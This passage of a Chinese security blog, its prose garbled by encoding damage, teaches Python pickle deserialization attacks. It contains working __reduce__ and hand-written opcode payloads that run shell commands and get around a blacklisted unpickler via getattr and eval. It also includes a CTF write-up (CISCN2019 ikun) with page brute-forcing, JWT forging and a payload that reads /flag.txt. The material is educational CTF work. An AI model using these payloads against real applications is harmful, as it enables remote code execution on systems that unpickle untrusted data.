class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickletools<br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> os<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">exp</span>(<span class="hljs-params"><span class="hljs-built_in">object</span></span>):</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__reduce__</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-keyword">return</span> (os.system,(<span class="hljs-string">&#x27;whoami&#x27;</span>,))<br>e = exp()<br>s = pickle.dumps(e,protocol=<span class="hljs-number">2</span>)  <span class="hljs-comment">#python3.8é»˜è®¤æ˜¯ç‰ˆæœ¬4ï¼Œä¼šå°†æ“ä½œç¬¦æ¢æˆåå…­è¿›åˆ¶</span><br>pickletools.dis(s)<br><br><br>    <span class="hljs-number">0</span>: \x80 PROTO      <span class="hljs-number">2</span><span class="hljs-comment">#åè®®ç‰ˆæœ¬ </span><br>    <span class="hljs-number">2</span>: c    GLOBAL     <span class="hljs-string">&#x27;nt system&#x27;</span><span class="hljs-comment">#å°†&#x27;nt system&#x27;å‹å…¥æ ˆä¸­       os.system</span><br>   <span class="hljs-number">13</span>: q    BINPUT     <span class="hljs-number">0</span><span class="hljs-comment">#æŠŠå¯¹è±¡å­˜å‚¨åˆ°memoçš„ç¬¬0ä¸ªä½ç½®</span><br>   <span class="hljs-number">15</span>: X    BINUNICODE <span class="hljs-string">&#x27;whoami&#x27;</span><span class="hljs-comment">#å‹å…¥ä¸€ä¸ªutf-8çš„å…ƒç´ å‚æ•°   &#x27;whoami&#x27;</span><br>   <span class="hljs-number">26</span>: q    BINPUT     <span class="hljs-number">1</span><span class="hljs-comment">#å­˜å‚¨åˆ°memoçš„ç¬¬1ä¸ªä½ç½®</span><br>   <span class="hljs-number">28</span>: \x85 TUPLE1<span class="hljs-comment">#å°†å‰é¢çš„å…ƒç´ å‚æ•°å¼¹å‡ºï¼Œç»„æˆå…ƒç»„å†å‹æ ˆï¼Œç±»æ¯”äºå‘½ä»¤&#x27;t&#x27;     (&#x27;whoami&#x27;,)</span><br>   <span class="hljs-number">29</span>: q    BINPUT     <span class="hljs-number">2</span><span class="hljs-comment">#å°†ä¸Šé¢çš„å…ƒç»„å­˜å‚¨åˆ°memoçš„ç¬¬2ä¸ªä½ç½®           ...</span><br>   <span class="hljs-number">31</span>: R    REDUCE<span class="hljs-comment">#å°†å¯¹è±¡å’Œå…ƒç»„ç»„åˆæ‰§è¡Œï¼Œç»“æœå‹æ ˆ          os.system(&#x27;whoami&#x27;)</span><br>   <span class="hljs-number">32</span>: q    BINPUT     <span class="hljs-number">3</span><span class="hljs-comment">#å­˜å‚¨åˆ°memoçš„ç¬¬3ä¸ªä½ç½®ä¸Š                    ...</span><br>   <span class="hljs-number">34</span>: .    STOP<span class="hljs-comment">#ç»“æŸ</span><br>highest protocol among opcodes = <span class="hljs-number">2</span><br><br>Process finished <span class="hljs-keyword">with</span> exit code <span class="hljs-number">0</span><br><br><br>ç”¨protocol=<span class="hljs-number">0</span>è¾“å‡ºä¸º<br>cnt<br>system<br>p0<br>(Vwhoami<br>p1<br>tp2<br>Rp3<br>.<br></code></pre></div></td></tr></table></figure><p>äº†è§£è¿™äº›æ˜¯ä¸ºäº†ä¾¿äºä¸‹é¢å°è¯•æ‰‹åŠ¨æ„é€ <code>opcode</code>ï¼Œå› ä¸ºæœ‰æ—¶å€™ä¼šç¦æ­¢ä½¿ç”¨æŸäº›æ¨¡å—æˆ–è€…å‘½ä»¤æ‰§è¡Œå‡½æ•°æ—¶ï¼Œéœ€è¦è‡ªå·±æ„é€ æ¥è¿›è¡Œç»•è¿‡ã€‚ä¾‹å¦‚å½“æºç å¦‚ä¸‹æ—¶ï¼š</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> io<br><span class="hljs-keyword">import</span> builtins<br><br>__all__ = (<span class="hljs-string">&#x27;PickleSerializer&#x27;</span>, )<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">RestrictedUnpickler</span>(<span class="hljs-params">pickle.Unpickler</span>):</span><br>    blacklist = &#123;<span class="hljs-string">&#x27;eval&#x27;</span>, <span class="hljs-string">&#x27;exec&#x27;</span>, <span class="hljs-string">&#x27;execfile&#x27;</span>, <span class="hljs-string">&#x27;compile&#x27;</span>, <span class="hljs-string">&#x27;open&#x27;</span>, <span class="hljs-string">&#x27;input&#x27;</span>, <span class="hljs-string">&#x27;__import__&#x27;</span>, <span class="hljs-string">&#x27;exit&#x27;</span>&#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">find_class</span>(<span class="hljs-params">self, module, name</span>):</span><br>        <span class="hljs-comment"># Only allow safe classes from builtins.</span><br>        <span class="hljs-keyword">if</span> module == <span class="hljs-string">&quot;builtins&quot;</span> <span class="hljs-keyword">and</span> name <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> self.blacklist:<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">getattr</span>(builtins, name)<br>        <span class="hljs-comment"># Forbid everything else.</span><br>        <span class="hljs-keyword">raise</span> pickle.UnpicklingError(<span class="hljs-string">&quot;global &#x27;%s.%s&#x27; is forbidden&quot;</span> %<br>                                     (module, name))<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">PickleSerializer</span>():</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dumps</span>(<span class="hljs-params">self, obj</span>):</span><br>        <span class="hljs-keyword">return</span> pickle.dumps(obj)<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">loads</span>(<span class="hljs-params">self, data</span>):</span><br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(data, <span class="hljs-built_in">str</span>):<br>                <span class="hljs-keyword">raise</span> TypeError(<span class="hljs-string">&quot;Can&#x27;t load pickle from unicode string&quot;</span>)<br>            file = io.BytesIO(data)<br>            <span class="hljs-keyword">return</span> RestrictedUnpickler(file,<br>                              encoding=<span class="hljs-string">&#x27;ASCII&#x27;</span>, errors=<span class="hljs-string">&#x27;strict&#x27;</span>).load()<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-keyword">return</span> &#123;&#125;<br></code></pre></div></td></tr></table></figure><p>ç”¨<code>RestrictedUnpickler</code>ç±»è®¾ç½®äº†ä¸€ä¸ªç™½åå•ï¼Œåˆ¤æ–­<code>module == &quot;builtins&quot;</code>é™åˆ¶äº†å¿…é¡»ä¸º<code>builtins</code>ï¼Œè¿™å…¶å®ä¹Ÿæ˜¯å®˜æ–¹ç»™å‡ºçš„é˜²å¾¡æ–¹æ³•ä¹‹ä¸€ï¼Œè¿™é‡Œé™åˆ¶äº†æ¨¡å—å¼•ç”¨ï¼Œå±é™©å‡½æ•°ä¹Ÿæ— æ³•ç›´æ¥ç”¨äº†ï¼Œä½†å¯ä»¥ç”¨<code>getattr</code>æ¥æ„é€ opcode.</p><p>ä»æ˜¾ç¤ºä¸Šçœ‹ï¼Œæ˜æ˜¾æ˜¯0ç‰ˆæœ¬æ›´ä¸ºå¥½æ„é€ ï¼Œæ—¢ç„¶å¦‚æ­¤ï¼Œå°±ç”¨0ç‰ˆæœ¬æ¥æ‰‹å†™ä¸€ä¸ªã€‚</p><p>è¿™é‡Œå…ˆå°è¯•æ„é€ ä¸€ä¸ª<code>builtins.getattr(builtins, &#39;eval&#39;),(&#39;__import__(&quot;os&quot;).system(&quot;whoami&quot;)&#39;,)</code>ã€‚</p><p>é¦–å…ˆå¾—ç¡®ä¿å¼•å…¥äº†<code>builtins</code>æ¨¡å—ï¼Œåˆæ— æ³•ç›´æ¥å‹å…¥å•ä¸€å¯¹è±¡ï¼Œä¹Ÿå°±æ˜¯éœ€è¦ä»æŸä¸ªæ¨¡å—ä¸­è°ƒç”¨åˆ°<code>builtins</code>ã€‚ä¾‹å¦‚<code>builtins.__dict__.get(&#39;globals&#39;)().get(&#39;__builtins__&#39;)</code>æˆ–è€…<code>builtins.globals().get(&#39;builtins&#39;)</code></p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickletools<br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span>  builtins<br><span class="hljs-comment">#builtins.getattr(builtins, &#x27;eval&#x27;),(&#x27;__import__(&quot;os&quot;).system(&quot;whoami&quot;)&#x27;,).</span><br><span class="hljs-comment">#builtins.__dict__.get(globals)().get(&#x27;builtins&#x27;)</span><br><span class="hljs-comment">#builtins.getattr(builtins.__dict__,&#x27;get&#x27;)(&#x27;globals&#x27;)().get(&#x27;__builtins__&#x27;)</span><br>test = <span class="hljs-string">b&quot;&quot;&quot;cbuiltins</span><br><span class="hljs-string">getattr</span><br><span class="hljs-string">(cbuiltins</span><br><span class="hljs-string">dict</span><br><span class="hljs-string">S&#x27;get&#x27;</span><br><span class="hljs-string">tR(cbuiltins</span><br><span class="hljs-string">globals</span><br><span class="hljs-string">(tRS&#x27;builtins&#x27;</span><br><span class="hljs-string">tR.</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>data = pickle.loads(test)<br><span class="hljs-built_in">print</span>(data)<br></code></pre></div></td></tr></table></figure><p>è¿™é‡Œç†è§£å¾—æ—¶å€™è¦æ³¨æ„Ræ“ä½œç¬¦æ²¡æ‰§è¡Œä¸€æ¬¡éƒ½è¦è¿”å›ä¸€ä¸ªæ“ä½œç»“æœï¼Œæœ€å¼€å§‹çš„``builtins.getattr(dict, â€˜getâ€™)<code>æ¯”è¾ƒå®¹æ˜“ç†è§£ï¼Œåé¢</code>(t<code>è¿™é‡Œæ˜¯å‹å…¥ç©ºå…ƒç»„ï¼Œå…¶å®ä¹Ÿå¯ä»¥ç”¨</code>)<code>ç›´æ¥å‹å…¥ç©ºå…ƒç»„ï¼Œç„¶åæ¥ä¸€ä¸ª</code>R<code>å°±è¿”å›äº†</code>globals<code>å…¨å±€å­—å…¸ï¼Œæœ€åå‹å…¥ä¸€ä¸ªå­—ç¬¦ä¸²</code>builtins<code>æ¥è·å–è¿™ä¸ªæ¨¡å—ã€‚ä¸‹é¢å°±å¯ä»¥æ‹¼æ¥</code>eval`å‘½ä»¤äº†ã€‚</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">test = <span class="hljs-string">b&quot;&quot;&quot;cbuiltins</span><br><span class="hljs-string">getattr</span><br><span class="hljs-string">(cbuiltins</span><br><span class="hljs-string">dict</span><br><span class="hljs-string">S&#x27;get&#x27;</span><br><span class="hljs-string">tR(cbuiltins</span><br><span class="hljs-string">globals</span><br><span class="hljs-string">(tRS&#x27;builtins&#x27;</span><br><span class="hljs-string">tRp1</span><br><span class="hljs-string">cbuiltins</span><br><span class="hljs-string">getattr</span><br><span class="hljs-string">(g1 </span><br><span class="hljs-string">S&#x27;eval&#x27;</span><br><span class="hljs-string">tR(S&#x27;__import__(&quot;os&quot;).system(&quot;id&quot;)&#x27;</span><br><span class="hljs-string">tR.</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-comment">#g1å°±æ˜¯åˆšæ‰è·å–åˆ°çš„builtinsï¼Œæˆ‘ç»§ç»­ä½¿ç”¨getattrï¼Œè·å–åˆ°äº†builtins.evalã€‚</span><br></code></pre></div></td></tr></table></figure><p>é˜²å¾¡å¾—è¯å¯ä»¥è®¾ç½®ç™½åå•ï¼Œçœ‹ä¸€ä¸‹å®˜æ–¹å¾—æ–‡æ¡£ï¼Œæ¢æˆé»‘åå•è¿‡æ»¤ä¹Ÿè¡Œã€‚</p><p><img src="https://www.leavesongs.com/media/attachment/2019/05/27/e016b6fb-d6bd-402b-9f1c-59652fb1b9b4.9ad9519d3512.png" alt="image.png"></p><p>ç®—æ˜¯åœ¨opcodeå…¥äº†ä¸ªé—¨ï¼Œä½†è¿˜æ˜¯æŒºåŸºç¡€çš„ã€‚</p><p>ä¸€äº›å¸¸è§å¾—opcodeä¹Ÿæœ‰ç°æˆçš„ï¼Œå¯ä»¥å‚è€ƒï¼Œä½†è¿˜æ˜¯å¤šæ‰‹å†™ç†Ÿæ‚‰ä¸€ä¸‹ã€‚</p><p><a href="https://github.com/sensepost/anapickle/blob/master/anapickle.py">https://github.com/sensepost/anapickle/blob/master/anapickle.py</a></p><figure class="highlight py"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs py">MARK            = <span class="hljs-string">&#x27;(&#x27;</span>   <span class="hljs-comment"># push special markobject on stack</span><br>STOP            = <span class="hljs-string">&#x27;.&#x27;</span>   <span class="hljs-comment"># every pickle ends with STOP</span><br>POP             = <span class="hljs-string">&#x27;0&#x27;</span>   <span class="hljs-comment"># discard topmost stack item</span><br>POP_MARK        = <span class="hljs-string">&#x27;1&#x27;</span>   <span class="hljs-comment"># discard stack top through topmost markobject</span><br>DUP             = <span class="hljs-string">&#x27;2&#x27;</span>   <span class="hljs-comment"># duplicate top stack item</span><br>FLOAT           = <span class="hljs-string">&#x27;F&#x27;</span>   <span class="hljs-comment"># push float object; decimal string argument</span><br>INT             = <span class="hljs-string">&#x27;I&#x27;</span>   <span class="hljs-comment"># push integer or bool; decimal string argument</span><br>BININT          = <span class="hljs-string">&#x27;J&#x27;</span>   <span class="hljs-comment"># push four-byte signed int</span><br>BININT1         = <span class="hljs-string">&#x27;K&#x27;</span>   <span class="hljs-comment"># push 1-byte unsigned int</span><br>LONG            = <span class="hljs-string">&#x27;L&#x27;</span>   <span class="hljs-comment"># push long; decimal string argument</span><br>BININT2         = <span class="hljs-string">&#x27;M&#x27;</span>   <span class="hljs-comment"># push 2-byte unsigned int</span><br>NONE            = <span class="hljs-string">&#x27;N&#x27;</span>   <span class="hljs-comment"># push None</span><br>PERSID          = <span class="hljs-string">&#x27;P&#x27;</span>   <span class="hljs-comment"># push persistent object; id is taken from string arg</span><br>BINPERSID       = <span class="hljs-string">&#x27;Q&#x27;</span>   <span class="hljs-comment">#  &quot;       &quot;         &quot;  ;  &quot;  &quot;   &quot;     &quot;  stack</span><br>REDUCE          = <span class="hljs-string">&#x27;R&#x27;</span>   <span class="hljs-comment"># apply callable to argtuple, both on stack</span><br>STRING          = <span class="hljs-string">&#x27;S&#x27;</span>   <span class="hljs-comment"># push string; NL-terminated string argument</span><br>BINSTRING       = <span class="hljs-string">&#x27;T&#x27;</span>   <span class="hljs-comment"># push string; counted binary string argument</span><br>SHORT_BINSTRING = <span class="hljs-string">&#x27;U&#x27;</span>   <span class="hljs-comment">#  &quot;     &quot;   ;    &quot;      &quot;       &quot;      &quot; &lt; 256 bytes</span><br>UNICODE         = <span class="hljs-string">&#x27;V&#x27;</span>   <span class="hljs-comment"># push Unicode string; raw-unicode-escaped&#x27;d argument</span><br>BINUNICODE      = <span class="hljs-string">&#x27;X&#x27;</span>   <span class="hljs-comment">#   &quot;     &quot;       &quot;  ; counted UTF-8 string argument</span><br>APPEND          = <span class="hljs-string">&#x27;a&#x27;</span>   <span class="hljs-comment"># append stack top to list below it</span><br>BUILD           = <span class="hljs-string">&#x27;b&#x27;</span>   <span class="hljs-comment"># call __setstate__ or __dict__.update()</span><br>GLOBAL          = <span class="hljs-string">&#x27;c&#x27;</span>   <span class="hljs-comment"># push self.find_class(modname, name); 2 string args</span><br>DICT            = <span class="hljs-string">&#x27;d&#x27;</span>   <span class="hljs-comment"># build a dict from stack items</span><br>EMPTY_DICT      = <span class="hljs-string">&#x27;&#125;&#x27;</span>   <span class="hljs-comment"># push empty dict</span><br>APPENDS         = <span class="hljs-string">&#x27;e&#x27;</span>   <span class="hljs-comment"># extend list on stack by topmost stack slice</span><br>GET             = <span class="hljs-string">&#x27;g&#x27;</span>   <span class="hljs-comment"># push item from memo on stack; index is string arg</span><br>BINGET          = <span class="hljs-string">&#x27;h&#x27;</span>   <span class="hljs-comment">#   &quot;    &quot;    &quot;    &quot;   &quot;   &quot;  ;   &quot;    &quot; 1-byte arg</span><br>INST            = <span class="hljs-string">&#x27;i&#x27;</span>   <span class="hljs-comment"># build &amp; push class instance</span><br>LONG_BINGET     = <span class="hljs-string">&#x27;j&#x27;</span>   <span class="hljs-comment"># push item from memo on stack; index is 4-byte arg</span><br>LIST            = <span class="hljs-string">&#x27;l&#x27;</span>   <span class="hljs-comment"># build list from topmost stack items</span><br>EMPTY_LIST      = <span class="hljs-string">&#x27;]&#x27;</span>   <span class="hljs-comment"># push empty list</span><br>OBJ             = <span class="hljs-string">&#x27;o&#x27;</span>   <span class="hljs-comment"># build &amp; push class instance</span><br>PUT             = <span class="hljs-string">&#x27;p&#x27;</span>   <span class="hljs-comment"># store stack top in memo; index is string arg</span><br>BINPUT          = <span class="hljs-string">&#x27;q&#x27;</span>   <span class="hljs-comment">#   &quot;     &quot;    &quot;   &quot;   &quot; ;   &quot;    &quot; 1-byte arg</span><br>LONG_BINPUT     = <span class="hljs-string">&#x27;r&#x27;</span>   <span class="hljs-comment">#   &quot;     &quot;    &quot;   &quot;   &quot; ;   &quot;    &quot; 4-byte arg</span><br>SETITEM         = <span class="hljs-string">&#x27;s&#x27;</span>   <span class="hljs-comment"># add key+value pair to dict</span><br>TUPLE           = <span class="hljs-string">&#x27;t&#x27;</span>   <span class="hljs-comment"># build tuple from topmost stack items</span><br>EMPTY_TUPLE     = <span class="hljs-string">&#x27;)&#x27;</span>   <span class="hljs-comment"># push empty tuple</span><br>SETITEMS        = <span class="hljs-string">&#x27;u&#x27;</span>   <span class="hljs-comment"># modify dict by adding topmost key+value pairs</span><br>BINFLOAT        = <span class="hljs-string">&#x27;G&#x27;</span>   <span class="hljs-comment"># push float; arg is 8-byte float encoding</span><br><br>TRUE            = <span class="hljs-string">&#x27;I01\n&#x27;</span>  <span class="hljs-comment"># not an opcode; see INT docs in pickletools.py</span><br>FALSE           = <span class="hljs-string">&#x27;I00\n&#x27;</span>  <span class="hljs-comment"># not an opcode; see INT docs in pickletools.py</span><br><br><span class="hljs-comment"># Protocol 2</span><br><br>PROTO           = <span class="hljs-string">&#x27;\x80&#x27;</span>  <span class="hljs-comment"># identify pickle protocol</span><br>NEWOBJ          = <span class="hljs-string">&#x27;\x81&#x27;</span>  <span class="hljs-comment"># build object by applying cls.__new__ to argtuple</span><br>EXT1            = <span class="hljs-string">&#x27;\x82&#x27;</span>  <span class="hljs-comment"># push object from extension registry; 1-byte index</span><br>EXT2            = <span class="hljs-string">&#x27;\x83&#x27;</span>  <span class="hljs-comment"># ditto, but 2-byte index</span><br>EXT4            = <span class="hljs-string">&#x27;\x84&#x27;</span>  <span class="hljs-comment"># ditto, but 4-byte index</span><br>TUPLE1          = <span class="hljs-string">&#x27;\x85&#x27;</span>  <span class="hljs-comment"># build 1-tuple from stack top</span><br>TUPLE2          = <span class="hljs-string">&#x27;\x86&#x27;</span>  <span class="hljs-comment"># build 2-tuple from two topmost stack items</span><br>TUPLE3          = <span class="hljs-string">&#x27;\x87&#x27;</span>  <span class="hljs-comment"># build 3-tuple from three topmost stack items</span><br>NEWTRUE         = <span class="hljs-string">&#x27;\x88&#x27;</span>  <span class="hljs-comment"># push True</span><br>NEWFALSE        = <span class="hljs-string">&#x27;\x89&#x27;</span>  <span class="hljs-comment"># push False</span><br>LONG1           = <span class="hljs-string">&#x27;\x8a&#x27;</span>  <span class="hljs-comment"># push long from &lt; 256 bytes</span><br>LONG4           = <span class="hljs-string">&#x27;\x8b&#x27;</span>  <span class="hljs-comment"># push really big long</span><br></code></pre></div></td></tr></table></figure><h1 id="CISCN2019-ååŒ—èµ›åŒº-Day1-Web2-ikun"><a href="#CISCN2019-ååŒ—èµ›åŒº-Day1-Web2-ikun" class="headerlink" title="[CISCN2019 ååŒ—èµ›åŒº Day1 Web2]ikun"></a>[CISCN2019 ååŒ—èµ›åŒº Day1 Web2]ikun</h1><p>è€ƒç‚¹å°±æ˜¯jwtä¼ªé€ å’Œpickleååºåˆ—åŒ–</p><p>é¢˜ç›®æœ‰æç¤ºæ˜¯è¦æ‰¾åˆ°<code>lv6</code>ï¼Œå†™ä¸ªè„šæœ¬çˆ†ç ´å°±è¡Œï¼Œåœ¨<code>page=181</code>å‘ç°<code>lv6</code>ï¼Œä½†è´­ä¹°æ•°é¢å¾ˆå¤§ï¼ŒæŠ“åŒ…å‘ç°å¯ä»¥æ”¹æŠ˜æ‰£ç„¶åä¼šè¿›è¡Œä¸€ä¸ªè·³è½¬<code>/b1g_m4mber</code>ï¼Œ</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span>  requests<br>url = <span class="hljs-string">&#x27;http://6429f3b4-abd3-4051-88e2-a078083710f8.node4.buuoj.cn:81/shop?&#x27;</span><br>s = requests.session()<br>cookie = &#123;<span class="hljs-string">&#x27;UM_distinctid&#x27;</span>:<span class="hljs-string">&#x27;178da808111afb-0cc46980b0aa53-406d2516-1fa400-178da808112649&#x27;</span>&#125;<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1000</span>):<br>    p = url + <span class="hljs-string">&#x27;page=&#x27;</span> + <span class="hljs-built_in">str</span>(i)<br>    content = s.get(url=p).text<br>    <span class="hljs-built_in">print</span>(p)<br>    <span class="hljs-comment"># print(content)</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;lv6.png&#x27;</span> <span class="hljs-keyword">in</span> content:<br>        <span class="hljs-built_in">print</span>(i)<br></code></pre></div></td></tr></table></figure><p>è®¿é—®éœ€è¦adminæ‰è¡Œï¼ŒæŠ“åŒ…å¯ä»¥çœ‹åˆ°æœ‰cookieä¸­æœ‰<code>JWT</code>å€¼ï¼Œåˆ™å¯ä»¥çŒœæƒ³åˆ°æ˜¯ä¼ªé€ <code>jwt</code>ï¼Œå¯†ç çˆ†ç ´å‡ºæ¥æ˜¯<code>1Kun</code></p><p><img src="https://img-blog.csdnimg.cn/eebe3cb51aca470ab7cdc674b2ce86b0.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>ä»¥adminç™»é™†åå°±å¯ä»¥å‘ç°æºç äº†ã€‚</p><p><img src="https://img-blog.csdnimg.cn/de33790712914320baff419ad4113daf.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>çœ‹åˆ°æºç ï¼Œæ˜¯<code>tornado</code>æ¡†æ¶ï¼Œå…¨å±€æœäº†ä¸€ä¸‹<code>pickle</code>çœ‹åˆ°äº†å…¥å£</p><p><img src="https://img-blog.csdnimg.cn/a10e8eb54e644f10a0905768521b37e6.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>è¿™é‡Œç›´æ¥<code>pickle.loads</code>ååºåˆ—åŒ–æ•°æ®äº†ï¼Œæ²¡æœ‰ä»»ä½•ä¸ºéš¾ã€‚æ³¨æ„è¿™ä¸ªåœ°æ–¹ç”¨çš„æ˜¯<code>python2</code>å†™çš„ï¼Œæœ‰äº›<code>python3</code>çš„æ¨¡å—æ— æ³•å¯¼è‡´å‘½ä»¤æ‰§è¡Œã€‚</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> subprocess<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">exp</span>:</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__reduce__</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-keyword">return</span> (<span class="hljs-built_in">eval</span>, (<span class="hljs-string">&quot;open(&#x27;/flag.txt&#x27;,&#x27;r&#x27;).read()&quot;</span>,))<br>        <span class="hljs-comment"># return (eval,(&quot;\&quot;os.popen(&#x27;ls /&#x27;).read()\&quot;&quot;,))</span><br>        <span class="hljs-comment"># return (commands.getoutput, (&#x27;ls /&#x27;,))</span><br>test = exp()<br>test = pickle.dumps(test,protocol=<span class="hljs-number">0</span>)<br><span class="hljs-built_in">print</span>(test)<br>p = quote(test)<br><span class="hljs-built_in">print</span>(p)<br></code></pre></div></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/2894210024f64f87b1d85b541a085df4.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>è¿™ä¸ªåœ°æ–¹å¾—åŠ ä¸Š<code>xsrf</code>åŸå› åœ¨äºåœ¨å®ä¾‹åŒ–çš„æ—¶å€™è®¾ç½®äº†<code>xsrf_cookies=True</code>ï¼Œå¹¶ä¸”åœ¨æ¨¡æ¿æ¸²æŸ“æ—¶è¿˜æœ‰<code>&#123;% raw xsrf_form_html() %&#125;</code></p><p><img 